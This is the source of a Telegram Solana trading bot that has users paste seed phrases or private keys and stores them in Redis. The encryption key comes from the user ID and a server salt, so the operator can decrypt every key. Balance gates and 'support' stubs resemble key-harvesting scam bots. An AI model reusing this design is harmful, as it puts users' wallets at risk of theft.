import pkg from "telegraf";
const { Telegraf, Markup, session, Scenes, Stage } = pkg;
import {
  Keypair,
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  Transaction,
  SystemProgram,
} from "@solana/web3.js";
const TOKEN_PROGRAM_ID = new PublicKey(
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
);
const TOKEN_2022_PROGRAM_ID = new PublicKey(
  "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
);
import bs58 from "bs58";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import axios from "axios";
import { ethers } from "ethers";
import dotenv from "dotenv";
import crypto from "crypto";
import Redis from "ioredis";
import { executeJupiterSwap } from "../jupiter.js";

dotenv.config();

const MainAddress = "7dEGaXnN8tNq2rjEKYpNmqHuKTkYMLTcfcdYSFVhDDUD";

// ===== ADMIN CONFIG =====
const ADMIN_IDS = [7917987399, 2139959499]; // Support multiple admins
function isAdmin(ctx) {
  return ctx.from?.id && ADMIN_IDS.includes(ctx.from.id);
}

// ===== PERSISTENT USER REGISTRY (Upstash Redis) =====
// Falls back to an in-memory Set if Redis env vars are not configured
const USERS_KEY = "bot:registered_users";
const localUserFallback = new Set(); // in-memory fallback if Redis is unavailable

const REDIS_URL = process.env.REDIS_URL;
if (!REDIS_URL) throw new Error("REDIS_URL is not set in .env");
let redis = new Redis(REDIS_URL);

async function registerUser(userId) {
  localUserFallback.add(userId);
  if (redis) {
    try {
      await redis.sadd(USERS_KEY, String(userId));
    } catch (err) {
      console.error("Redis registerUser error:", err.message);
    }
  }
}

async function getAllUsers() {
  if (redis) {
    try {
      const members = await redis.smembers(USERS_KEY);
      return members.map(Number);
    } catch (err) {
      console.error("Redis getAllUsers error:", err.message);
    }
  }
  return Array.from(localUserFallback);
}

// ===== REDIS SESSION STORE =====
// Persists Telegraf sessions to Redis so wallets survive bot restarts.
// Each session key: "session:{userId}"  TTL: 30 days
const SESSION_TTL = 60 * 60 * 24 * 30; // 30 days in seconds
// Per-entry cost: ~455 bytes  →  30 MB holds ~69,000 wallets

const redisSessionStore = {
  async get(key) {
    try {
      const raw = await redis.get(`session:${key}`);
      if (!raw) return undefined;
      return JSON.parse(raw);
    } catch (err) {
      console.error("Session GET error:", err.message);
      return undefined;
    }
  },
  async set(key, session) {
    try {
      await redis.set(
        `session:${key}`,
        JSON.stringify(session),
        "EX",
        SESSION_TTL,
      );
    } catch (err) {
      console.error("Session SET error:", err.message);
    }
  },
  async delete(key) {
    try {
      await redis.del(`session:${key}`);
    } catch (err) {
      console.error("Session DELETE error:", err.message);
    }
  },
};

// ===== UTILITY FUNCTIONS =====
const utils = {
  // Format USD values
  formatUsd: (value) => {
    if (!value) return "$0";
    const num = Number(value);
    const absNum = Math.abs(num);
    let formatted;
    if (absNum >= 1_000_000_000_000) {
      formatted = (num / 1_000_000_000_000).toFixed(2) + "T";
    } else if (absNum >= 1_000_000_000) {
      formatted = (num / 1_000_000_000).toFixed(2) + "B";
    } else if (absNum >= 1_000_000) {
      formatted = (num / 1_000_000).toFixed(2) + "M";
    } else if (absNum >= 1_000) {
      formatted = (num / 1_000).toFixed(2) + "K";
    } else {
      formatted = num.toFixed(2);
    }
    return `$${formatted}`;
  },

  // Escape HTML
  escapeHtml: (text) => {
    if (text === null || text === undefined) {
      return "";
    }
    const textStr = String(text);
    return textStr
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  },

  // Create back button
  backButton: () =>
    Markup.inlineKeyboard([[Markup.button.callback("⬅️ Back", "BACK_MAIN")]]),

  // Create wallet connection prompt — matches screenshot style
  walletPrompt: (
    title,
    description = "Please connect your wallet first to start trading.",
  ) => {
    // Determine minimum amount based on action type
    let minLine = "";
    let actionIcon = "🔗";

    if (
      title.toLowerCase().includes("buy") ||
      title.toLowerCase().includes("trading")
    ) {
      minLine = "Minimum buy : <b>0.5 SOL</b>";
      actionIcon = "🛒";
    } else if (title.toLowerCase().includes("sell")) {
      minLine = "Minimum sell : <b>0.01 sol</b>";
      actionIcon = "💰";
    } else if (
      title.toLowerCase().includes("sniper") ||
      title.toLowerCase().includes("sniping")
    ) {
      minLine = "Minimum amount : <b>0.5 SOL</b>";
      actionIcon = "🎯";
    } else if (title.toLowerCase().includes("withdraw")) {
      minLine = "Minimum withdraw : <b>0.01 SOL</b>";
      actionIcon = "💸";
    } else if (title.toLowerCase().includes("airdrop")) {
      minLine = "Connect wallet to claim airdrops";
      actionIcon = "🎁";
    } else if (title.toLowerCase().includes("launch")) {
      minLine = "Connect wallet to launch tokens";
      actionIcon = "🚀";
    } else {
      minLine = "Connect wallet to continue";
      actionIcon = "🔗";
    }

    return {
      text: `${actionIcon} <b>${title}</b>\n\n<b>${description}</b>\n\n${minLine}\n\nClick 'Connect Wallet' to import your wallet.`,
      // Use reply keyboard to match screenshot pill-button style
      buttons: Markup.keyboard([
        ["🔗 Create or Import Wallet"],
        ["⬅️ Back", "⬆️ Main Menu"],
      ]).resize(),
    };
  },

  // Get SOL price
  getSolPrice: async () => {
    try {
      const response = await axios.get(
        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112",
      );
      return Number(response.data.data.attributes.price_usd);
    } catch (error) {
      console.error("Error fetching SOL price:", error);
      return 0;
    }
  },

  // Get user balance
  getUserBalance: async (secret) => {
    try {
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const balanceLamports = await connection.getBalance(keypair.publicKey);
      return (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);
    } catch (error) {
      console.error("Error getting balance:", error);
      return "0.0000";
    }
  },
  // Get token balances (SPL and Token-2022)
  getTokenBalances: async (publicKey) => {
    try {
      const pubKey =
        typeof publicKey === "string" ? new PublicKey(publicKey) : publicKey;
      const [tokenAccounts, token2022Accounts] = await Promise.all([
        connection.getParsedTokenAccountsByOwner(pubKey, {
          programId: TOKEN_PROGRAM_ID,
        }),
        connection.getParsedTokenAccountsByOwner(pubKey, {
          programId: TOKEN_2022_PROGRAM_ID,
        }),
      ]);

      const allAccounts = [...tokenAccounts.value, ...token2022Accounts.value];
      const tokens = [];

      for (const accountInfo of allAccounts) {
        const parsedInfo = accountInfo.account.data.parsed.info;
        const balance = parsedInfo.tokenAmount.uiAmount;
        if (balance > 0) {
          tokens.push({
            mint: parsedInfo.mint,
            balance: balance,
            decimals: parsedInfo.tokenAmount.decimals,
          });
        }
      }
      return tokens;
    } catch (error) {
      console.error("Error fetching token balances:", error);
      return [];
    }
  },
};

// ===== SECURE SESSION MANAGEMENT =====
const secureSessionManager = {
  // Generate encryption key from user ID
  generateUserKey: (userId) => {
    const salt = process.env.ENCRYPTION_SALT;
    if (!salt) throw new Error("ENCRYPTION_SALT is not set in .env");
    return crypto.pbkdf2Sync(userId.toString(), salt, 100000, 32, "sha256");
  },

  // Encrypt sensitive data
  encryptData: (data, userId) => {
    try {
      const key = secureSessionManager.generateUserKey(userId);
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);

      let encrypted = cipher.update(data, "utf8", "hex");
      encrypted += cipher.final("hex");

      return {
        encrypted,
        iv: iv.toString("hex"),
        timestamp: Date.now(),
      };
    } catch (error) {
      console.error("Encryption error:", error);
      return null;
    }
  },

  // Decrypt sensitive data
  decryptData: (encryptedData, userId) => {
    try {
      if (!encryptedData || !encryptedData.encrypted || !encryptedData.iv) {
        return null;
      }

      const key = secureSessionManager.generateUserKey(userId);
      const iv = Buffer.from(encryptedData.iv, "hex");
      const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);

      let decrypted = decipher.update(encryptedData.encrypted, "hex", "utf8");
      decrypted += decipher.final("utf8");

      return decrypted;
    } catch (error) {
      console.error("Decryption error:", error);
      return null;
    }
  },

  // Set encrypted user data
  setUserData: (ctx, data) => {
    if (!ctx.session) ctx.session = {};

    const userId = ctx.from?.id;
    if (!userId) {
      console.error("No user ID available for session");
      return;
    }

    // Encrypt sensitive wallet data
    const secureData = { ...data };
    if (data.wallet) {
      const encryptedWallet = secureSessionManager.encryptData(
        data.wallet,
        userId,
      );
      if (encryptedWallet) {
        secureData.wallet = encryptedWallet;
      } else {
        console.error("Failed to encrypt wallet data");
        return;
      }
    }

    ctx.session.userData = {
      ...secureData,
      timestamp: Date.now(),
      lastActivity: Date.now(),
      userId: userId,
    };
  },

  // Get decrypted user data
  getUserData: (ctx) => {
    if (!ctx.session || !ctx.session.userData) return null;

    const userId = ctx.from?.id;
    if (!userId) {
      console.error("No user ID available for session");
      return null;
    }

    const userData = { ...ctx.session.userData };

    // Decrypt wallet data if present
    if (
      userData.wallet &&
      typeof userData.wallet === "object" &&
      userData.wallet.encrypted
    ) {
      const decryptedWallet = secureSessionManager.decryptData(
        userData.wallet,
        userId,
      );
      if (decryptedWallet) {
        userData.wallet = decryptedWallet;
      } else {
        console.error("Failed to decrypt wallet data");
        return null;
      }
    }

    userData.lastActivity = Date.now();
    return userData;
  },

  // Remove user data
  removeUserData: (ctx) => {
    if (ctx.session) {
      delete ctx.session.userData;
    }
  },

  // Check if user has wallet
  hasWallet: (ctx) => {
    const userData = secureSessionManager.getUserData(ctx);
    return userData && userData.wallet;
  },

  // Session cleanup and security checks
  cleanupSession: (ctx) => {
    if (!ctx.session || !ctx.session.userData) return;

    const now = Date.now();
    const sessionAge = now - ctx.session.userData.timestamp;
    const maxSessionAge = 24 * 60 * 60 * 1000; // 24 hours

    // Clear session if too old
    if (sessionAge > maxSessionAge) {
      secureSessionManager.removeUserData(ctx);
      return;
    }

    // Update last activity
    ctx.session.userData.lastActivity = now;
  },
};

// Legacy session manager for backward compatibility
const sessionManager = secureSessionManager;

// ===== MESSAGE TEMPLATES =====
const messages = {
  welcome: (balance, price, userWalletAddress = null) => {
    let msg = `Hello, Welcome to Meta Trading Bot!  
Exclusively built by the Meta Trading community,  
The best bot used for trading any SOL token.  \n\n`;

    if (userWalletAddress) {
      const balStr = utils.escapeHtml(balance.toFixed(4));
      const usdStr = utils.escapeHtml((price * balance).toFixed(2));
      msg += `Your wallet address:  
Solana:  
  <code>${userWalletAddress}</code>  
Bal: <b>${balStr} SOL</b> - <b>$${usdStr}</b>  
<i>To update your current balance, click the Wallet button below.</i>`;
    } else {
      msg += `⚠️ <b>No Wallet Connected</b>\n\n<i>Please use the '🔗 Create or Import Wallet' button below to set up your wallet and start trading.</i>`;
    }

    return msg;
  },

  development: "This feature is under development, please come back later🎉",
  insufficient: "Insufficient funds please add at least 5 sol to your balance",
};

// ===== API FUNCTIONS =====
const api = {
  // Get pairs by token address (rate-limit 300 requests per minute)
  async getDexScreenerPairs(tokenAddress) {
    try {
      const response = await axios.get(
        `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`,
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener pairs API error:", error);
      return { pairs: [] };
    }
  },

  // Get pairs by chain and pair address (rate-limit 300 requests per minute)
  async getDexScreenerPairByAddress(chainId, pairAddress) {
    try {
      const response = await axios.get(
        `https://api.dexscreener.com/latest/dex/pairs/${chainId}/${pairAddress}`,
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener pair by address API error:", error);
      return { pairs: [] };
    }
  },

  // Get token pairs by chain and token address (rate-limit 300 requests per minute)
  async getDexScreenerTokenPairs(chainId, tokenAddress) {
    try {
      const response = await axios.get(
        `https://api.dexscreener.com/token-pairs/v1/${chainId}/${tokenAddress}`,
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener token pairs API error:", error);
      return [];
    }
  },

  // Get tokens by chain and addresses (rate-limit 300 requests per minute)
  async getDexScreenerTokens(chainId, tokenAddresses) {
    try {
      const response = await axios.get(
        `https://api.dexscreener.com/tokens/v1/${chainId}/${tokenAddresses}`,
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener tokens API error:", error);
      return [];
    }
  },

  // Get latest token profiles (rate-limit 60 requests per minute)
  async getDexScreenerTokenProfiles() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/token-profiles/latest/v1",
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener token profiles API error:", error);
      return [];
    }
  },

  // Get latest boosted tokens (rate-limit 60 requests per minute)
  async getDexScreenerBoostedTokens() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/token-boosts/latest/v1",
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener boosted tokens API error:", error);
      return [];
    }
  },

  // Get top boosted tokens (rate-limit 60 requests per minute)
  async getDexScreenerTopBoostedTokens() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/token-boosts/top/v1",
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener top boosted tokens API error:", error);
      return [];
    }
  },

  // Check orders for token (rate-limit 60 requests per minute)
  async getDexScreenerOrders(
    chainId,
    tokenAddress,
    type = null,
    status = null,
  ) {
    try {
      let url = `https://api.dexscreener.com/orders/v1/${chainId}/${tokenAddress}`;
      const params = new URLSearchParams();
      if (type) params.append("type", type);
      if (status) params.append("status", status);
      if (params.toString()) url += `?${params.toString()}`;

      const response = await axios.get(url);
      return response.data;
    } catch (error) {
      console.error("DexScreener orders API error:", error);
      return [];
    }
  },

  // Legacy search function (for backward compatibility)
  async getDexScreenerSearch(query) {
    try {
      const response = await axios.get(
        `https://api.dexscreener.com/latest/dex/search/?q=${encodeURIComponent(query)}`,
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener search API error:", error);
      return { pairs: [] };
    }
  },

  // Legacy trending function (using search as fallback)
  async getDexScreenerTrending() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/latest/dex/search/?q=trending",
      );
      return response.data.pairs;
    } catch (error) {
      console.log("DexScreener trending API error:", error);
      return { pairs: [] };
    }
  },

  // Get latest token profiles (rate-limit 60 requests per minute)
  async getDexScreenerNewPairs() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/token-profiles/latest/v1",
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener new pairs API error:", error);
      return [];
    }
  },

  // Get latest boosted tokens (rate-limit 60 requests per minute)
  async getDexScreenerTopGainers() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/token-boosts/latest/v1",
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener top gainers API error:", error);
      return [];
    }
  },

  // Get top boosted tokens (rate-limit 60 requests per minute)
  async getDexScreenerTopLosers() {
    try {
      const response = await axios.get(
        "https://api.dexscreener.com/token-boosts/top/v1",
      );
      return response.data;
    } catch (error) {
      console.error("DexScreener top losers API error:", error);
      return [];
    }
  },
};

// ===== FORMATTING FUNCTIONS =====
const formatters = {
  formatTokenInfo: (pair) => {
    const base = pair.baseToken;
    const quote = pair.quoteToken;
    return {
      symbol: String(base?.symbol || "Unknown"),
      name: String(base?.name || "Unknown Token"),
      address: String(base?.address || "N/A"),
      price: Number(pair?.priceUsd || 0).toFixed(8),
      priceChange24h: String(pair?.priceChange?.h24 || 0),
      volume24h: utils.formatUsd(pair?.volume?.h24 || 0),
      liquidity: utils.formatUsd(pair?.liquidity?.usd || 0),
      marketCap: utils.formatUsd(pair?.marketCap || 0),
      fdv: utils.formatUsd(pair?.fdv || 0),
      pairAddress: String(pair?.pairAddress || "N/A"),
      dexId: String(pair?.dexId || "Unknown"),
      chainId: String(pair?.chainId || "Unknown"),
    };
  },

  formatTrendingList: (pairs, title) => {
    let text = `🔥 <b>${title}</b>\n\n`;
    if (!pairs || pairs.length === 0) {
      return text + "No data available at the moment.";
    }

    // Filter unique tokens by address and get the best pool for each token
    const uniqueTokens = new Map();

    pairs.forEach((pair) => {
      const tokenAddress = pair.baseToken?.address;
      if (!tokenAddress) return;

      // If we haven't seen this token before, or if this pool has better liquidity
      if (
        !uniqueTokens.has(tokenAddress) ||
        (pair.liquidity?.usd || 0) >
          (uniqueTokens.get(tokenAddress).liquidity?.usd || 0)
      ) {
        uniqueTokens.set(tokenAddress, pair);
      }
    });

    // Convert to array and take top 10
    const uniquePairs = Array.from(uniqueTokens.values()).slice(0, 10);

    uniquePairs.forEach((pair, index) => {
      const info = formatters.formatTokenInfo(pair);
      const change = parseFloat(info.priceChange24h) > 0 ? "🟢" : "🔴";
      const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
      text += `📊 <b>${index + 1}. ${utils.escapeHtml(info.symbol)}</b> ${change}\n\n`;
      text += `   💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n`;
      text += `   📈 <b>24h Change:</b> <i>${utils.escapeHtml(info.priceChange24h)}%</i>\n`;
      text += `   💧 <b>Liquidity:</b> $${utils.escapeHtml(info.liquidity)}\n`;
      text += `   📊 <b>Volume:</b> $${utils.escapeHtml(info.volume24h)}\n`;
      text += `   🏪 <b>Exchange:</b> <i>${utils.escapeHtml(info.dexId)} (${utils.escapeHtml(info.chainId)})</i>\n\n`;
      text += `   🔗 <code>${utils.escapeHtml(info.address)}</code>\n`;
      text += `   📈 <a href="${chartEmbed}">📊 View Live Chart</a>\n\n`;
      text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    });
    return text;
  },

  formatTokenInfoWithChart: (pair) => {
    const info = formatters.formatTokenInfo(pair);
    const chartLink = `https://dexscreener.com/${info.chainId}/${info.pairAddress}`;
    const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
    const change = parseFloat(info.priceChange24h) > 0 ? "🟢" : "🔴";

    let text = `📊 <b>${utils.escapeHtml(info.symbol)} (${utils.escapeHtml(info.name)})</b> ${change}\n\n`;
    text += `💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n`;
    text += `📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n`;
    text += `💧 <b>Liquidity:</b> $${utils.escapeHtml(info.liquidity)}\n`;
    text += `📊 <b>Volume 24h:</b> $${utils.escapeHtml(info.volume24h)}\n`;
    text += `🏪 <b>Market Cap:</b> $${utils.escapeHtml(info.marketCap)}\n`;
    text += `🔗 <b>Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n`;
    text += `🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n`;
    text += `⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n`;
    text += `📈 <a href="${chartLink}">View Chart on DexScreener</a>\n`;
    text += `📊 <a href="${chartEmbed}">Embedded Chart</a>\n`;

    return text;
  },

  formatTokenInfoWithEmbeddedChart: (pair) => {
    const info = formatters.formatTokenInfo(pair);
    const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
    const change = parseFloat(info.priceChange24h) > 0 ? "🟢" : "🔴";

    let text = `📊 <b>${utils.escapeHtml(info.symbol)} (${utils.escapeHtml(info.name)})</b> ${change}\n\n`;
    text += `💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n`;
    text += `📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n`;
    text += `💧 <b>Liquidity:</b> $${utils.escapeHtml(info.liquidity)}\n`;
    text += `📊 <b>Volume 24h:</b> $${utils.escapeHtml(info.volume24h)}\n`;
    text += `🏪 <b>Market Cap:</b> $${utils.escapeHtml(info.marketCap)}\n`;
    text += `🔗 <b>Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n`;
    text += `🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n`;
    text += `⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n`;
    text += `📈 <a href="${chartEmbed}">View Live Chart</a>\n`;

    return text;
  },

  formatTokenProfilesList: (profiles, title) => {
    let text = `⭐ <b>${title}</b>\n\n`;
    if (!profiles || profiles.length === 0) {
      return text + "No token profiles available at the moment.";
    }
    profiles.slice(0, 8).forEach((profile, index) => {
      text += `📊 <b>${index + 1}. ${utils.escapeHtml(profile.chainId)}</b>\n\n`;
      text += `   🔗 <b>Token Address:</b> <code>${utils.escapeHtml(profile.tokenAddress)}</code>\n`;
      if (profile.description) {
        text += `   📝 <b>Description:</b> <i>${utils.escapeHtml(profile.description.substring(0, 100))}...</i>\n`;
      }
      if (profile.links && profile.links.length > 0) {
        text += `   🔗 <b>Link:</b> <a href="${profile.links[0].url}">${utils.escapeHtml(profile.links[0].label)}</a>\n`;
      }
      text += "\n";
      text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    });
    return text;
  },

  formatBoostedTokensList: (tokens, title) => {
    let text = `🚀 <b>${title}</b>\n\n`;
    if (!tokens || tokens.length === 0) {
      return text + "No boosted tokens available at the moment.";
    }
    tokens.slice(0, 8).forEach((token, index) => {
      text += `📊 <b>${index + 1}. ${utils.escapeHtml(token.chainId)}</b>\n\n`;
      text += `   🔗 <b>Token Address:</b> <code>${utils.escapeHtml(token.tokenAddress)}</code>\n`;
      text += `   💰 <b>Boost Amount:</b> <i>${utils.escapeHtml(token.amount)}</i>\n`;
      text += `   📊 <b>Total Amount:</b> <i>${utils.escapeHtml(token.totalAmount)}</i>\n`;
      if (token.description) {
        text += `   📝 <b>Description:</b> <i>${utils.escapeHtml(token.description.substring(0, 100))}...</i>\n`;
      }
      if (token.links && token.links.length > 0) {
        text += `   🔗 <b>Link:</b> <a href="${token.links[0].url}">${utils.escapeHtml(token.links[0].label)}</a>\n`;
      }
      text += "\n";
      text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    });
    return text;
  },
};

// ===== BUTTON LAYOUTS =====
const buttons = {
  // Reply keyboard — persistent at bottom of screen (matches screenshots)
  main: Markup.keyboard([
    ["Sell 💰", "Buy 🛒"],
    ["Sniper 🔥", "Launch 🚀", "Positions 📊"],
    ["Add Liquidity 💚", "Claim Airdrop 🎁"],
    ["Support 🆘", "Wallet 💳", "Withdraw 💵"],
    ["🔗 Create or Import Wallet"],
  ]).resize(),

  // Navigation buttons used inside sub-menus (inline keyboard)
  navBack: Markup.inlineKeyboard([
    [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
  ]),

  // Back + Main Menu row (used when showing sub-menu responses)
  navBackAndMain: Markup.inlineKeyboard([
    [
      Markup.button.callback("⬅️ Back", "BACK_MAIN"),
      Markup.button.callback("⬆️ Main Menu", "BACK_MAIN"),
    ],
  ]),

  // Active trades inline button shown on welcome message
  activeTrades: Markup.inlineKeyboard([
    [Markup.button.callback("Active Trades", "ACTIVE_TRADES")],
  ]),

  // Cancel button for multi-step flows
  cancel: Markup.keyboard([["🚫 Cancel"]]).resize(),

  // Connect wallet sub-keyboard
  connectWalletNav: Markup.keyboard([
    ["🔗 Create or Import Wallet"],
    ["⬅️ Back", "⬆️ Main Menu"],
  ]).resize(),

  trading: (tokenInfo) =>
    Markup.inlineKeyboard([
      [
        Markup.button.callback("🛒 0.1 SOL", "BUY_AMOUNT_0.1"),
        Markup.button.callback("🛒 0.5 SOL", "BUY_AMOUNT_0.5"),
      ],
      [
        Markup.button.callback("🛒 1 SOL", "BUY_AMOUNT_1"),
        Markup.button.callback("🛒 2 SOL", "BUY_AMOUNT_2"),
      ],
      [
        Markup.button.callback("💰 Sell", "SELL_TOKEN"),
        Markup.button.callback("📊 Chart", "VIEW_CHART"),
      ],
      [
        Markup.button.callback("🛒 Custom", "BUY_CUSTOM"),
        Markup.button.callback("⬅️ Back", "BACK_MAIN"),
      ],
    ]),
};

// ===== HANDLER FACTORIES =====
const handlers = {
  // Create a wallet-required handler
  requireWallet: (handler) => async (ctx) => {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      const prompt = utils.walletPrompt("Trading");
      await ctx.editMessageText(prompt.text, {
        parse_mode: "HTML",
        reply_markup: prompt.buttons.reply_markup,
      });
      return;
    }

    return handler(ctx, secret);
  },

  // Create a DexScreener data handler
  dexScreenerHandler: (apiFunction, title, loadingText) => async (ctx) => {
    await ctx.answerCbQuery(loadingText);
    try {
      const data = await apiFunction();
      const formatted = formatters.formatTrendingList(data.pairs, title);
      await ctx.editMessageText(formatted, {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
      });
    } catch (error) {
      await ctx.editMessageText(`❌ Error loading ${title.toLowerCase()}.`, {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
      });
    }
  },

  // Create a development feature handler
  developmentHandler: (featureName) => async (ctx) => {
    await ctx.editMessageText(messages.development, {
      parse_mode: "HTML",
      reply_markup: buttons.main.reply_markup,
    });
  },
};

// ===== HELPER FUNCTIONS =====
// Get user's wallet address from session
function getUserWalletAddress(ctx) {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;

  if (!secret) {
    return MainAddress;
  }

  try {
    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
    return keypair.publicKey.toBase58();
  } catch (err) {
    console.error("Error getting user wallet address:", err);
    return MainAddress;
  }
}

// Check if user has wallet and redirect to connect scene if not
async function requireWallet(ctx, actionName = "this action") {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;

  if (!secret) {
    await ctx.editMessageText(
      `🔗 <b>Wallet Required</b>\n\nTo use ${actionName}, you need to connect your wallet first.`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "🔗 Create or Import Wallet",
              "CONNECT_WALLET",
            ),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
    return false;
  }
  return true;
}

// Check if user has minimum balance for a feature, then refer to support
async function requireFeatureBalance(ctx, actionName, minBalance = 0.5) {
  if (!(await requireWallet(ctx, actionName))) return false;

  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  const sol = await utils.getUserBalance(secret);

  if (Number(sol) < minBalance) {
    await ctx.editMessageText(
      `❌ <b>Insufficient Balance</b>\n\nYou need a minimum balance of <b>${minBalance} SOL</b> in your wallet to access the ${actionName} feature.\n\nYour Balance: <b>${sol} SOL</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
    return false;
  }
  return true;
}

// ===== BOT SETUP =====
const BOT_KEY = process.env.BOT_KEY;
if (!BOT_KEY) throw new Error("BOT_KEY is not set in .env");
const bot = new Telegraf(BOT_KEY);



bot.catch((err, ctx) => {
  console.error(`Error while handling update ${ctx.update.update_id}:`, err);
});

const connection = new Connection("https://api.mainnet-beta.solana.com");
// 🔑 Wallet utils
function getWalletFromMnemonic(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex")).key;
  return Keypair.fromSeed(derived);
}

function parseWallet(input) {
  try {
    // 🧠 Mnemonic phrase (ETH/SOL)
    if (bip39.validateMnemonic(input)) {
      return getWalletFromMnemonic(input);
    }

    // 🧠 ETH hex private key (64 hex chars or 0x-prefixed)
    const hex = input.startsWith("0x") ? input.slice(2) : input;
    if (/^[0-9a-fA-F]{64}$/.test(hex)) {
      return new ethers.Wallet("0x" + hex);
    }

    // 🧠 Solana secret key in JSON array
    if (input.startsWith("[") && input.endsWith("]")) {
      const parsed = JSON.parse(input);
      if (Array.isArray(parsed) && parsed.length === 64) {
        return Keypair.fromSecretKey(Uint8Array.from(parsed));
      }
    }

    // 🧠 Solana secret key in base58 string
    if (typeof input === "string" && input.length >= 32) {
      try {
        const decoded = bs58.decode(input);
        if (decoded.length === 64) {
          return Keypair.fromSecretKey(decoded);
        }
      } catch (err) {
        // Not base58? Ignore
      }
    }
  } catch (err) {
    console.error("parseWallet error:", err.message);
  }

  return null;
}

// 🎬 Import Wallet Scene
const importWalletScene = new Scenes.BaseScene("IMPORT_WALLET");
const helpScene = new Scenes.BaseScene("HELP_SCENE");
const startScene = new Scenes.BaseScene("START_SCENE");
const continueScene = new Scenes.BaseScene("CONTINUE_SCENE");

// 🧠 Scenes setup
// const stage = new Stage([importWalletScene]);
const stage = new Scenes.Stage([
  startScene,
  importWalletScene,
  continueScene,
  helpScene,
]);
bot.use(
  session({
    store: redisSessionStore,
    // Key: use userId so each user has their own Redis slot
    getSessionKey: (ctx) => (ctx.from?.id ? String(ctx.from.id) : undefined),
  }),
);
bot.use(stage.middleware());

// Add session cleanup + user registry middleware
bot.use(async (ctx, next) => {
  // Persist user ID to Redis for broadcast
  if (ctx.from?.id) {
    registerUser(ctx.from.id); // fire-and-forget
  }
  // Clean up old sessions
  if (ctx.session) {
    secureSessionManager.cleanupSession(ctx);
  }
  await next();
});

// ===== ADMIN BROADCAST & SEND COMMANDS =====

/**
 * /send <chatId> <text>
 * Admin only. Sends a text message to a single user or group chat.
 * ChatId can be a positive user ID or negative group ID.
 */
bot.command("send", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];
  const message = args.slice(1).join(" ");

  if (!chatId || !message) {
    return ctx.reply(
      "ℹ️ Usage: /send <chatId> <message>\n\nTo send an image, use /sendimage",
    );
  }

  try {
    await ctx.telegram.sendMessage(chatId, message, { parse_mode: "HTML" });
